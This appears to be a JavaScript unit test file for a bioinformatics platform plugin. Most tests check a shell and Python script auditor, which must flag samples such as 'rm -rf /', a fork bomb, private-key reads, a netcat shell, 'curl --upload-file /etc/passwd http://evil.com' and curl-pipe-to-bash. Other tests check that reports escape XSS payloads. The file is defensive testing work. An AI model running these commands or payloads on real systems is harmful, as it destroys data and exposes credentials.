// 单元层用例：插件自身纯逻辑模块（不依赖 dsh 平台）。
// 目的是把「与平台无关的正确性」也纳入回归网——平台升级时常伴随
// Node 版本/内置模块行为变化，这层能快速定位是平台问题还是插件问题。

import { join } from 'node:path';
import { test, assert, assertEqual, assertIncludes, ROOT } from '../lib/harness.mjs';

const mod = (p) => import(join(ROOT, 'lib', p));

// ---------------------------------------------------------------- atlas

test('unit', 'atlas/regions-shape', 'atlas.REGIONS 结构完整', async () => {
  const { REGIONS } = await mod('atlas.js');
  assert(Array.isArray(REGIONS), 'REGIONS 应为数组');
  assert(REGIONS.length > 0, 'REGIONS 不应为空');
  for (const r of REGIONS) {
    assert(r.name, `region 缺少 name: ${JSON.stringify(r)}`);
  }
});

test('unit', 'atlas/expert-constants-consistent', '专家常量 EXPERTS / EXPERT_KIND 相互一致', async () => {
  const { EXPERTS, EXPERT_KIND } = await mod('atlas.js');
  assert(Array.isArray(EXPERTS) && EXPERTS.length > 0, 'EXPERTS 应为非空数组');
  for (const e of EXPERTS) {
    const name = typeof e === 'string' ? e : e.name;
    assert(name, `专家条目缺少 name: ${JSON.stringify(e)}`);
    assert(EXPERT_KIND[name] !== undefined, `专家 ${name} 未在 EXPERT_KIND 中登记类别`);
  }
});

test('unit', 'atlas/skill-top-dirs', 'SKILL_TOP_DIRS 覆盖技能库一级目录', async () => {
  const { SKILL_TOP_DIRS, SKILLS_BASE, SKILLS_SNAPSHOT } = await mod('atlas.js');
  assert(Array.isArray(SKILL_TOP_DIRS) && SKILL_TOP_DIRS.length > 0, 'SKILL_TOP_DIRS 非空');
  assertEqual(SKILLS_BASE, '/public/skills', 'SKILLS_BASE 应为 /public/skills');
  assert(SKILLS_SNAPSHOT.startsWith(SKILLS_BASE), 'SKILLS_SNAPSHOT 应位于 SKILLS_BASE 下');
});

test('unit', 'atlas/hint-functions-callable', 'atlas 提示函数可调用且返回字符串', async () => {
  const a = await mod('atlas.js');
  for (const fn of ['searchHints', 'genpilotHints', 'containerHints', 'skillsHints']) {
    assertEqual(typeof a[fn], 'function', `${fn} 应为函数`);
    const out = a[fn]();
    assertEqual(typeof out, 'string', `${fn}() 应返回字符串`);
    assert(out.length > 0, `${fn}() 不应返回空串`);
  }
});

test('unit', 'atlas/genpilot-models', 'GENPILOT_MODELS 含默认模型且结构一致', async () => {
  const { GENPILOT_MODELS } = await mod('atlas.js');
  assert(Array.isArray(GENPILOT_MODELS) && GENPILOT_MODELS.length > 0, 'GENPILOT_MODELS 非空');
  const ids = GENPILOT_MODELS.map((m) => (typeof m === 'string' ? m : m.id || m.name));
  for (const id of ids) assert(id, `模型条目缺少 id: ${JSON.stringify(GENPILOT_MODELS)}`);
});

// ---------------------------------------------------------------- audit

test('unit', 'audit/flags-dangerous-rm', 'audit 能识别全部危险 rm -rf 变体', async () => {
  const { auditScript } = await mod('audit.js');
  // 覆盖尾随斜杠 / 路径 / 通配 / 家目录 / 多空格 等变体
  const cases = ['rm -rf /', 'rm -rf /data/work', 'rm -rf *', 'rm -rf ~', 'rm -rf / '];
  const missed = [];
  for (const cmd of cases) {
    const r = auditScript(cmd, 'shell');
    const critical = r.findings.filter((f) => f.severity === 'critical' || f.severity === 'high');
    if (critical.length === 0) missed.push(cmd);
  }
  assertEqual(missed.length, 0, `以下危险删除命令未被识别: ${JSON.stringify(missed)}`);
});

test('unit', 'audit/flags-dangerous-rm-extended', 'audit 覆盖 rm 的扩展危险变体（通配/上级/变量/xargs）', async () => {
  const { auditScript } = await mod('audit.js');
  // 这些变体同样可造成不可逆丢失。分级可接受（critical 或 high），但不能完全不报。
  const cases = [
    ['rm -rf /*', '通配符删除根下全部'],
    ['rm -rf ..', '删除上级目录'],
    ['rm -rf $TARGET', '变量间接（无法静态求值即视为危险）'],
    ['echo x | xargs rm -rf', 'xargs 转发删除'],
  ];
  const missed = [];
  for (const [cmd, why] of cases) {
    const r = auditScript(cmd, 'shell');
    const risky = r.findings.filter((f) => f.severity === 'critical' || f.severity === 'high');
    if (risky.length === 0) missed.push(`${cmd} (${why})`);
  }
  assertEqual(missed.length, 0, `以下危险变体未被识别: ${missed.join('; ')}`);
});

test('unit', 'audit/flags-other-destructive-ops', 'audit 覆盖其它破坏性操作（find -delete / dd / 重定向覆盖）', async () => {
  const { auditScript } = await mod('audit.js');
  const cases = [
    ['find / -delete', 'find 直接删除'],
    ['dd of=/dev/sda', 'dd 写裸设备（无 if）'],
    ['> /etc/passwd', '重定向覆盖系统文件'],
  ];
  const missed = [];
  for (const [cmd, why] of cases) {
    const r = auditScript(cmd, 'shell');
    const risky = r.findings.filter((f) => f.severity === 'critical' || f.severity === 'high');
    if (risky.length === 0) missed.push(`${cmd} (${why})`);
  }
  assertEqual(missed.length, 0, `以下破坏性操作未被识别: ${missed.join('; ')}`);
});

test('unit', 'audit/clean-script-low-risk', 'audit 对普通安全脚本不误报高危', async () => {
  const { auditScript } = await mod('audit.js');
  const r = auditScript('#!/bin/bash\necho hello\nls -l /tmp\n', 'shell');
  const critical = r.findings.filter((f) => f.severity === 'critical');
  assertEqual(critical.length, 0, `安全脚本被误判为 critical: ${JSON.stringify(critical)}`);
});

test('unit', 'audit/no-false-positive-on-idiomatic-cleanup', '生信脚本的常规清理写法不触发 critical/high', async () => {
  const { auditScript } = await mod('audit.js');
  // 这些都是真实生信脚本里的标准写法，规则收紧时极易误伤。
  // 误报会造成告警疲劳，最终让人忽略真正的 critical —— 与安全目标相悖。
  const safe = [
    'rm -rf ./build',
    'rm -rf build',
    'rm -rf $WORKDIR/tmp',
    'rm -rf $WORKDIR/$SAMPLE/tmp',
    'rm -f /tmp/scratch.txt',
    'find . -type f -name "*.tmp" -print',
    'find /data -name "*.bam" -print | wc -l',
    'dd if=input.bin of=output.bin bs=1M',
    'echo hello > /tmp/result.txt',
    'cat /public/ref/genome.fa | head -100',
    'bash /data/work/pipeline.sh --shard 0',
  ];
  const noise = [];
  for (const cmd of safe) {
    const r = auditScript(cmd, 'shell');
    const risky = r.findings.filter((f) => f.severity === 'critical' || f.severity === 'high');
    if (risky.length > 0) noise.push(`${cmd} → ${risky.map((f) => f.severity).join(',')}`);
  }
  assertEqual(noise.length, 0, `以下常规清理写法被误报为 critical/high: ${noise.join('; ')}`);
});

test('unit', 'audit/absolute-path-severity-grading', '绝对路径删除按危险程度分级', async () => {
  const { auditScript } = await mod('audit.js');
  const sevOf = (cmd) => {
    const r = auditScript(cmd, 'shell');
    const pathFindings = r.findings.filter((f) => /删除/.test(f.message));
    const order = { critical: 3, high: 2, medium: 1, low: 0, info: 0 };
    return pathFindings.reduce((m, f) => Math.max(m, order[f.severity] || 0), 0);
  };
  // 根目录必须 critical（最高级）；容器工作区 high；普通临时目录不高于 medium
  assertEqual(sevOf('rm -rf /'), 3, 'rm -rf / 必须为 critical');
  assertEqual(sevOf('rm -rf /data/work'), 2, 'rm -rf /data/work 应为 high');
  assert(sevOf('rm -rf /tmp/scratch') <= 1, 'rm -rf /tmp/scratch 不应为 high/critical（避免告警疲劳）');
});

test('unit', 'audit/flags-data-destruction', 'audit 覆盖数据破坏类操作（截断/擦除/写满磁盘）', async () => {
  const { auditScript } = await mod('audit.js');
  const danger = [
    'truncate -s 0 data.bam',           // 数据文件清零
    'truncate -s 0 /data/raw.fastq',
    'shred -u /data/x.bam',             // 不可逆擦除
    'cat /dev/urandom > /data/f',       // 写满磁盘
    'cp /dev/zero /data/disk',
    'dd if=/dev/zero of=/data/fill',
  ];
  const missed = danger.filter((c) => {
    const f = auditScript(c, 'shell').findings;
    return f.filter((x) => x.severity === 'critical' || x.severity === 'high').length === 0;
  });
  assertEqual(missed.length, 0, `未识别的数据破坏操作: ${JSON.stringify(missed)}`);
});

test('unit', 'audit/flags-credential-exposure', 'audit 覆盖凭据泄露与外传风险', async () => {
  const { auditScript } = await mod('audit.js');
  const danger = [
    'cat ~/.ssh/id_rsa',
    'cat /root/.aws/credentials',
    'ssh-keygen -f /root/.ssh/id_rsa -N ""',
    'nc -l 4444 | bash',
    'iptables -F',
    'chown -R root:root /',
  ];
  const missed = danger.filter((c) => {
    const f = auditScript(c, 'shell').findings;
    return f.filter((x) => x.severity === 'critical' || x.severity === 'high').length === 0;
  });
  assertEqual(missed.length, 0, `未识别的凭据/外泄风险: ${JSON.stringify(missed)}`);
});

test('unit', 'audit/no-false-positive-on-common-bioinformatics', '常见生信写法不误报 critical/high', async () => {
  const { auditScript } = await mod('audit.js');
  // 这些是真实生信脚本里的常规写法；误报会造成告警疲劳，
  // 最终让人忽略真正的 critical —— 与安全目标相悖。
  const safe = [
    'truncate -s 0 $WORKDIR/log.txt',        // 清空日志（常规）
    'shred --version',                        // 纯查询
    'truncate --help',
    'dd if=input.bam of=sub.bam bs=1M count=10',
    'dd if=/dev/zero of=$WORKDIR/test.img bs=1M count=1',
    'cp /dev/null $WORKDIR/out.txt',
    'chmod -R 755 $WORKDIR',
    'chown -R $USER:$GROUP .',
    'while read -r line; do echo "$line"; done < input.txt',
    'for f in *.bam; do samtools index "$f"; done',
    'curl -O https://example.com/ref.fa',
    'wget -q https://example.com/d.tar.gz -O d.tar.gz',
    'cat /data/ref/genome.fa | head',
    'service --status-all',
    'nc -z localhost 8080',
    'yes | conda install -y samtools',
    'ls -l /tmp',
    'mkdir -p $WORKDIR/out',
  ];
  const noise = [];
  for (const cmd of safe) {
    const f = auditScript(cmd, 'shell').findings;
    const hi = f.filter((x) => x.severity === 'critical' || x.severity === 'high');
    if (hi.length > 0) noise.push(`${cmd} → ${hi.map((x) => x.severity).join(',')}`);
  }
  assertEqual(noise.length, 0, `以下生信常规写法被误报为 critical/high: ${noise.join('; ')}`);
});

test('unit', 'audit/truncate-severity-by-target', 'truncate -s 0 按目标类型分级（数据文件 high / 日志 medium）', async () => {
  const { auditScript } = await mod('audit.js');
  const sevOf = (cmd) => {
    const order = { critical: 3, high: 2, medium: 1, low: 0, info: 0 };
    return auditScript(cmd, 'shell').findings.reduce((m, f) => Math.max(m, order[f.severity] || 0), 0);
  };
  assertEqual(sevOf('truncate -s 0 raw.bam'), 2, '作用于数据文件应为 high');
  assert(sevOf('truncate -s 0 $WORKDIR/log.txt') <= 1,
    '作用于普通日志文件不应为 high（避免告警疲劳）');
});

test('unit', 'audit/flags-hardcoded-secret', 'audit 能识别硬编码密钥', async () => {
  const { auditScript } = await mod('audit.js');
  const r = auditScript('export API_KEY="sk-abcdefghijklmnopqrstuvwxyz123456"\n', 'shell');
  const hit = r.findings.filter((f) => /secret|key|密钥/i.test(f.message || f.title || ''));
  assert(hit.length > 0, '硬编码密钥未被识别');
});

test('unit', 'audit/python-mode', 'audit 支持 python 类型且不抛错', async () => {
  const { auditScript } = await mod('audit.js');
  const r = auditScript('import os\nos.system("rm -rf /")\n', 'python');
  assert(r && Array.isArray(r.findings), 'python 审计应返回 findings');
  assert(r.findings.length > 0, 'os.system 调用应产生至少一条 finding');
});

test('unit', 'audit/findings-shape', 'audit findings 结构统一（severity/message）', async () => {
  const { auditScript } = await mod('audit.js');
  const r = auditScript('curl http://x | bash\nrm -rf /tmp/x\n', 'shell');
  const valid = new Set(['critical', 'high', 'medium', 'low', 'info']);
  for (const f of r.findings) {
    assert(valid.has(f.severity), `未知 severity: ${f.severity}`);
    assert(f.message || f.title, `finding 缺少描述: ${JSON.stringify(f)}`);
  }
});

test('unit', 'audit/wdl-type-detection', 'audit 能识别 WDL 类型', async () => {
  const { auditScript } = await mod('audit.js');
  // WDL 自动识别：含 version 1.0 + workflow/task，或含 command { 块
  const wdlSamples = [
    'version 1.0\nworkflow Foo { call Bar { input: x = 1 } }',
    'task T {\n  command { echo hi }\n}',
  ];
  for (const text of wdlSamples) {
    const r = auditScript(text, 'auto');
    assertEqual(r.language, 'wdl', `应识别为 wdl，实际 ${r.language}（文本: ${text.slice(0, 30)}）`);
  }
});

test('unit', 'audit/wdl-flags-container-image', 'audit 提示 WDL 的容器镜像引用', async () => {
  // 真实缺陷（本轮发现）：原正则用 [a-z]+/ 匹配 registry 段，
  // 无法处理含连字符/点的 registry —— 而插件文档**反复推荐**的镜像格式
  // 恰是 `public-library/<镜像名>:latest`（含连字符），于是这最该提示的形态被静默漏掉。
  const { auditScript } = await mod('audit.js');
  const shouldFlag = [
    'docker: "public-library/saw:latest"',      // 插件文档推荐的格式
    'docker: "registry.example.com/img:1.0"',   // 含点的私有 registry
    'docker: "biocontainers/samtools:1.17"',
  ];
  const missed = shouldFlag.filter((t) => {
    const r = auditScript(t, 'wdl');
    return !r.findings.some((f) => /镜像/.test(f.message));
  });
  assertEqual(missed.length, 0,
    `以下含镜像引用的 WDL 片段未被提示（可能导致投递时才发现镜像不可用）: ${missed.join('; ')}`);
});

test('unit', 'audit/wdl-flags-resources', 'audit 提示 WDL 的资源声明', async () => {
  const { auditScript } = await mod('audit.js');
  const cases = ['cpu: 8', 'memory: "32 GB"', 'memory: 16GB'];
  const missed = cases.filter((t) => {
    const r = auditScript(t, 'wdl');
    return !r.findings.some((f) => /资源/.test(f.message));
  });
  assertEqual(missed.length, 0, `以下资源声明未被提示: ${missed.join('; ')}`);
});

test('unit', 'audit/wdl-no-false-positive-on-plain', '纯 WDL 逻辑不误报镜像/资源', async () => {
  const { auditScript } = await mod('audit.js');
  // 不含 docker: 与 cpu/memory 声明的普通 WDL 不应产生这几类提示
  const plain = 'version 1.0\nworkflow W {\n  call T { input: x = 1 }\n}';
  const r = auditScript(plain, 'wdl');
  const noise = r.findings.filter((f) => /镜像|资源/.test(f.message));
  assertEqual(noise.length, 0, `普通 WDL 被误报: ${noise.map((f) => f.message).join('; ')}`);
});

test('unit', 'audit/every-rule-has-triggering-sample', '每条审计规则都有可触发的样本（防规则静默失效）', async () => {
  // 覆盖率驱动：先前的经验是「规则看起来对、实际漏检真实格式」
  // （如 docker registry 含连字符、rm -rf / 的行尾边界）。
  // 本用例为**每条规则**准备一个应触发的样本，逐一验证确实命中 ——
  // 任一规则失效（正则写坏、被后续改动破坏）都会立即暴露。
  const { auditScript } = await mod('audit.js');
  const { readFileSync } = await import('node:fs');

  // 从源码提取全部规则（正则 + msg + 所属类型），确保覆盖到每一行
  const src = readFileSync(join(ROOT, 'lib', 'audit.js'), 'utf8');
  const rulesOf = (name) => {
    const m = src.match(new RegExp(name + ' = \\[([\\s\\S]*?)\\n\\];'));
    const block = m ? m[1] : '';
    const out = [];
    const re = /\{\s*re:\s*\/((?:[^\/\\]|\\.)+)\/([a-z]*)\s*,\s*sev:\s*'(\w+)'\s*,\s*msg:\s*'([^']+)'/g;
    let x;
    while ((x = re.exec(block))) out.push({ pattern: x[1], flags: x[2], sev: x[3], msg: x[4] });
    return out;
  };
  const all = [
    ...rulesOf('SHELL_RULES').map((r) => ({ ...r, type: 'shell' })),
    ...rulesOf('PYTHON_RULES').map((r) => ({ ...r, type: 'python' })),
    ...rulesOf('WDL_RULES').map((r) => ({ ...r, type: 'wdl' })),
  ];
  assert(all.length >= 45, `提取到的规则数偏少（${all.length}），提取规则可能失效`);

  // 每条规则一个应触发样本，用 msg 的关键片段做关联
  const SAMPLES = [
    ['rm -rf / 删除根目录', 'rm -rf /', 'shell'],
    ['挂载/工作区', 'rm -rf /data/work', 'shell'],
    ['递归删除绝对路径', 'rm -rf /tmp/x', 'shell'],
    ['删除家目录', 'rm -rf ~', 'shell'],
    ['通配删除当前目录', 'rm -rf *', 'shell'],
    ['通配删除根目录下全部', 'rm -rf /*', 'shell'],
    ['删除上级目录', 'rm -rf ..', 'shell'],
    ['删除目标是变量本身', 'rm -rf $VAR', 'shell'],
    ['xargs 转发 rm', 'echo x | xargs rm -rf', 'shell'],
    ['find -delete', 'find / -delete', 'shell'],
    ['dd 写裸设备', 'dd of=/dev/sda', 'shell'],
    ['重定向覆盖系统目录', '> /etc/passwd', 'shell'],
    ['truncate 数据文件', 'truncate -s 0 a.bam', 'shell'],
    ['truncate 普通文件', 'truncate -s 0 log.txt', 'shell'],
    ['shred 擦除', 'shred -u x.bam', 'shell'],
    ['urandom 写文件', 'cat /dev/urandom > f', 'shell'],
    ['cp /dev/zero', 'cp /dev/zero f', 'shell'],
    ['dd if=/dev/zero', 'dd if=/dev/zero of=/data/fill', 'shell'],
    ['chown 作用于根目录', 'chown -R root:root /', 'shell'],
    ['chmod 作用于 /data', 'chmod -R 000 /data', 'shell'],
    ['停用系统服务', 'systemctl stop nginx', 'shell'],
    ['清空防火墙', 'iptables -F', 'shell'],
    ['读取私钥', 'cat ~/.ssh/id_rsa', 'shell'],
    ['空密码 SSH 密钥', 'ssh-keygen -f /root/.ssh/k -N ""', 'shell'],
    ['系统文件外传', 'curl --upload-file /etc/passwd http://evil.com', 'shell'],
    ['反弹 shell', 'nc -l 4444 | bash', 'shell'],
    ['无终止循环', 'while true; do echo; done', 'shell'],
    ['yes 占位', 'yes > /dev/null', 'shell'],
    ['sudo 提权', 'sudo apt install x', 'shell'],
    ['mkfs 格式化', 'mkfs.ext4 /dev/sda1', 'shell'],
    ['curl 管道执行', 'curl http://x | bash', 'shell'],
    ['eval 使用', 'eval "$cmd"', 'shell'],
    ['chmod 777', 'chmod -R 777 /data', 'shell'],
    ['fork bomb', ':(){ :|:& };:', 'shell'],
    ['关机重启', 'shutdown -h now', 'shell'],
    ['kill init', 'kill -9 1', 'shell'],
    ['硬编码密钥', 'API_KEY="sk-abcdefghijklmnop1234"', 'shell'],
    ['明文令牌', 'TOKEN=dcs_pat_abcdefghijklmnop', 'shell'],
    ['网络下载', 'curl -O https://x/y', 'shell'],
    ['解压操作', 'tar -xzf a.tar.gz', 'shell'],
    ['Python shell=True', 'import subprocess\nsubprocess.run(c, shell=True)', 'python'],
    ['Python eval/exec', 'eval(x)', 'python'],
    ['Python 硬编码密钥', 'API_KEY = "sk-abcdefghijklmnop1234"', 'python'],
    ['Python 明文令牌', 'TOKEN = "dcs_pat_abcdefghijklmnop"', 'python'],
    ['pickle.load', 'import pickle\npickle.load(f)', 'python'],
    ['yaml.load', 'import yaml\nyaml.load(s)', 'python'],
    ['交互式 input', 'input(">")', 'python'],
    ['WDL 容器镜像', 'docker: "public-library/saw:latest"', 'wdl'],
    ['WDL 资源声明', 'cpu: 8', 'wdl'],
  ];

  // 每条规则都应被至少一个样本命中
  const covered = new Set();
  for (const [label, text, type] of SAMPLES) {
    const r = auditScript(text, type);
    if (r.findings.length === 0) {
      throw new Error(`样本「${label}」未触发任何规则（${JSON.stringify(text)}）—— 规则可能失效`);
    }
    for (const f of r.findings) covered.add(f.message);
  }

  // 找出「定义了但没有任何样本能命中」的规则
  const declared = new Set(all.map((r) => r.msg));
  const uncovered = [...declared].filter((m) => !covered.has(m));
  assertEqual(uncovered.length, 0,
    `以下规则有定义但没有样本能触发（规则可能已失效或被写坏）:\n  ${uncovered.join('\n  ')}`);
});

test('unit', 'audit/realistic-scripts-no-false-positive', '真实生信脚本零 critical/high 误报（防告警疲劳）', async () => {
  // 与「每条规则都有样本」互补的另一半：**精确率**。
  // 误报会让用户对告警脱敏，最终忽略真正的 critical —— 与安全目标相悖。
  // 本用例用 20 个贴近真实生信流程的脚本片段，要求 critical/high 误报为 0。
  const { auditScript } = await mod('audit.js');

  const shellSafe = [
    '#!/bin/bash\nset -euo pipefail\nfastp -i in.fq -o out.fq\nbwa mem ref.fa out.fq | samtools sort -o a.bam',
    '#!/bin/bash\nset -e\nbcftools view -v snps in.vcf > out.vcf',
    '#!/bin/bash\nset -e\nmkdir -p $WORKDIR/out && cp data.bam $WORKDIR/out/',
    '#!/bin/bash\nset -e\nrm -rf ./tmp_build && make',
    '#!/bin/bash\nset -e\npython3 -c "import pandas as pd; print(pd.__version__)"',
    '#!/bin/bash\nset -e\nsamtools index sample.bam',
    '#!/bin/bash\nset -e\nfor f in *.bam; do samtools index "$f"; done',
    '#!/bin/bash\nset -e\nwhile read -r s; do echo "$s"; done < samples.txt',
    '#!/bin/bash\nset -e\ntar -xzf ref.tar.gz -C $WORKDIR/ref',
    '#!/bin/bash\nset -e\ncurl -o ref.fa https://example.com/ref.fa',
    '#!/bin/bash\nset -e\ndd if=input.bin of=output.bin bs=1M',
    '#!/bin/bash\nset -e\nfind /data -name "*.bam" | wc -l',
    '#!/bin/bash\nset -e\nchmod +x script.sh',
    '#!/bin/bash\nset -e\ntruncate -s 0 $WORKDIR/app.log',
    '#!/bin/bash\nset -e\nrm -rf $WORKDIR/$SAMPLE/tmp',
  ];
  const pySafe = [
    'import os\nprint(os.getcwd())',
    'import subprocess\nsubprocess.run(["samtools","index","a.bam"], check=True)',
    'import yaml\ncfg = yaml.safe_load(open("c.yml"))',
    'import json\nprint(json.dumps({"a": 1}))',
    'import pandas as pd\ndf = pd.read_csv("x.csv")',
  ];

  const noise = [];
  for (const s of shellSafe) {
    const f = auditScript(s, 'shell').findings.filter((x) => ['critical', 'high'].includes(x.severity));
    if (f.length) noise.push(`shell ${JSON.stringify(s.split('\n')[2] || s.slice(0, 40))} → ${f.map((x) => x.message.slice(0, 26)).join(' | ')}`);
  }
  for (const s of pySafe) {
    const f = auditScript(s, 'python').findings.filter((x) => ['critical', 'high'].includes(x.severity));
    if (f.length) noise.push(`python ${JSON.stringify(s.split('\n')[0])} → ${f.map((x) => x.message.slice(0, 26)).join(' | ')}`);
  }
  assertEqual(noise.length, 0,
    `以下真实脚本片段被误报为 critical/high（会造成告警疲劳）:\n  ${noise.join('\n  ')}`);
});

// ---------------------------------------------------------------- plan

test('unit', 'plan/generates-markdown-file', 'generatePlan 写出含标题与步骤的 Markdown 文件', async () => {
  const { generatePlan } = await mod('plan.js');
  const { mkdtempSync, readFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const dir = mkdtempSync(join(tmpdir(), 'dcs-plan-'));
  const res = generatePlan({
    title: '兼容性测试计划',
    steps: [{ desc: '步骤一', status: '完成', detail: '已跑通' }],
    outputs: [{ name: 'report', path: '/work/report.md', desc: '报告' }],
  }, { outPath: join(dir, 'plan.md') });
  // generatePlan 返回 { path, ... } 或路径字符串，两种都兼容
  const outPath = typeof res === 'string' ? res : (res && (res.path || res.outPath));
  assert(outPath, `generatePlan 应返回产物路径，实际: ${JSON.stringify(res)}`);
  const md = readFileSync(outPath, 'utf8');
  assertIncludes(md, '兼容性测试计划', '应包含标题');
  assertIncludes(md, '步骤一', '应包含步骤');
  assertIncludes(md, '#', '应为 Markdown');
});

test('unit', 'plan/handles-empty-input', 'generatePlan 对空输入不抛错且仍产出文件', async () => {
  const { generatePlan } = await mod('plan.js');
  const { mkdtempSync, existsSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const dir = mkdtempSync(join(tmpdir(), 'dcs-plan-empty-'));
  const res = generatePlan({}, { outPath: join(dir, 'empty.md') });
  const outPath = typeof res === 'string' ? res : (res && (res.path || res.outPath));
  assert(outPath, '空输入也应返回产物路径');
  assert(existsSync(outPath), `空输入也应写出文件: ${outPath}`);
});

// ---------------------------------------------------------------- report

test('unit', 'report/generates-html', 'generateReport 产出 self-contained HTML', async () => {
  const { generateReport } = await mod('report.js');
  const out = await generateReport({
    title: '兼容性报告',
    objective: '目标',
    results: '## 结果\n内容',
    figures: [],
  });
  const html = typeof out === 'string' ? out : out && (out.html || out.path);
  assert(html, 'generateReport 应返回 HTML 内容或路径');
  if (typeof out === 'string' && out.includes('<')) {
    assertIncludes(out, '<', '应含 HTML 标签');
  }
});

// ---------------------------------------------------------------- report（HTML 转义）

test('unit', 'report/markdown-escapes-html', '报告 Markdown 渲染会转义 HTML（防注入）', async () => {
  // 真实缺陷（本轮发现）：report.js 的 inline() 直接对原文套 Markdown 标记，
  // **未先转义 HTML** —— 报告正文里若出现 <script>（来自上游数据/文件内容/
  // 模型输出）会被原样写入并执行；[x](javascript:...) 也会生成可点击的危险链接。
  // 报告是自包含 HTML，用户会直接用浏览器打开，因此这是真实的 XSS 路径。
  const { generateReport } = await mod('report.js');
  const { mkdtempSync, readFileSync, rmSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const dir = mkdtempSync(join(tmpdir(), 'rep-'));

  try {
    const out = await generateReport({
      title: 'XSS 测试',
      results: [
        '## 含 HTML 的结果',
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '[click](javascript:alert(1))',
      ].join('\n'),
      figures: [],
    }, { outDir: dir });

    const html = typeof out === 'string' ? readFileSync(out, 'utf8') : (out.html || readFileSync(out.path, 'utf8'));

    // 1) 不得出现可执行的 <script>（转义后的 &lt;script&gt; 是允许的）
    assert(!/<script[^>]*>alert/i.test(html),
      '报告中出现了未转义的 <script>（XSS）');
    // 2) 不得出现带 onerror 的 <img> 注入
    assert(!/<img[^>]*onerror=/i.test(html),
      '报告中出现了未转义的 onerror 属性（XSS）');
    // 3) 危险协议的链接不得渲染为可点击的 <a href>
    assert(!/<a[^>]*href="javascript:/i.test(html),
      '报告中出现了 javascript: 链接（XSS）');
    assert(!/<a[^>]*href="data:/i.test(html),
      '报告中出现了 data: 链接（可能用于注入）');
    // 4) 原始文本应仍然可见（转义而非丢弃）
    assertIncludes(html, 'alert(1)', '转义后原文应仍可见（不应静默丢弃内容）');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('unit', 'report/markdown-keeps-legit-formatting', '报告 Markdown 渲染保留正常格式', async () => {
  const { generateReport } = await mod('report.js');
  const { mkdtempSync, readFileSync, rmSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const dir = mkdtempSync(join(tmpdir(), 'rep2-'));
  try {
    const out = await generateReport({
      title: 'T',
      results: '## 标题\n\n**粗体** 与 *斜体* 与 `code`\n\n[docs](https://example.com)\n\n- 项目一\n- 项目二',
      figures: [],
    }, { outDir: dir });
    const html = typeof out === 'string' ? readFileSync(out, 'utf8') : (out.html || readFileSync(out.path, 'utf8'));

    assertIncludes(html, '<strong>粗体</strong>', '粗体应保留');
    assertIncludes(html, '<em>斜体</em>', '斜体应保留');
    assertIncludes(html, '<code>code</code>', '行内代码应保留');
    assertIncludes(html, 'https://example.com', '正常链接应保留（且不被转义破坏）');
    assert(/<a[^>]*href="https:\/\/example\.com"/.test(html), '正常 https 链接应渲染为 <a>');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------- tasks

test('unit', 'tasks/path-and-lock', 'tasksPath 与 withTaskLock 可用且锁能串行化', async () => {
  const { tasksPath, withTaskLock } = await mod('tasks.js');
  const p = tasksPath();
  assertEqual(typeof p, 'string', 'tasksPath 应返回字符串');
  assertIncludes(p, 'dcs-cloud-tasks.json', '路径应指向任务库文件');
  assertEqual(typeof withTaskLock, 'function', 'withTaskLock 应为函数');
  // 互斥语义：并发提交应保持提交顺序（否则多会话并发会互相覆盖）
  const order = [];
  await Promise.all([
    withTaskLock(async () => { order.push(1); await new Promise((r) => setTimeout(r, 15)); order.push(2); }),
    withTaskLock(async () => { order.push(3); }),
  ]);
  assertEqual(order.join(','), '1,2,3', `互斥锁未串行化，实际顺序 ${order.join(',')}`);
});

test('unit', 'tasks/load-empty', 'loadTasks 对未知会话返回空结构而不抛错', async () => {
  const { loadTasks } = await mod('tasks.js');
  const t = loadTasks('__compat_nonexistent_session__');
  assert(t && typeof t === 'object', 'loadTasks 应返回对象');
});

// ---------------------------------------------------------------- projects

test('unit', 'projects/list-empty-safe', 'listProjects 在无项目时安全返回', async () => {
  const { listProjects } = await mod('projects.js');
  const out = listProjects();
  assert(out !== undefined && out !== null, 'listProjects 不应返回 undefined/null');
});

test('unit', 'projects/delivery-sections-shape', 'DELIVERY_SECTIONS 为完整的交付章节清单', async () => {
  const { DELIVERY_SECTIONS } = await mod('projects.js');
  assert(Array.isArray(DELIVERY_SECTIONS) && DELIVERY_SECTIONS.length > 0, 'DELIVERY_SECTIONS 非空');
  const keys = DELIVERY_SECTIONS.map((s) => (typeof s === 'string' ? s : s.key || s.id));
  for (const k of keys) assert(k, `交付章节缺少 key: ${JSON.stringify(DELIVERY_SECTIONS)}`);
  // 论文逻辑必备章节
  for (const need of ['question', 'data', 'methods', 'findings']) {
    assertIncludes(keys, need, `交付章节缺少 ${need}`);
  }
});

// ---------------------------------------------------------------- dcs-client

test('unit', 'dcs-client/exports-surface', 'dcs-client 导出插件依赖的全部函数', async () => {
  const c = await mod('dcs-client.js');
  for (const fn of ['loadCfg', 'saveCfg', 'runDcs', 'dcsLogin', 'dcsStatus', 'publicSearch', 'resolveDcsBinary', 'platformBinary']) {
    assertEqual(typeof c[fn], 'function', `dcs-client 缺少导出 ${fn}`);
  }
  assert(c.DCS_VERSION, 'DCS_VERSION 应存在');
});

test('unit', 'dcs-client/platform-binary-form', 'platformBinary 按平台返回合理值', async () => {
  const { platformBinary } = await mod('dcs-client.js');
  const out = platformBinary();
  assert(out === null || typeof out === 'string', 'platformBinary 应返回字符串或 null');
});
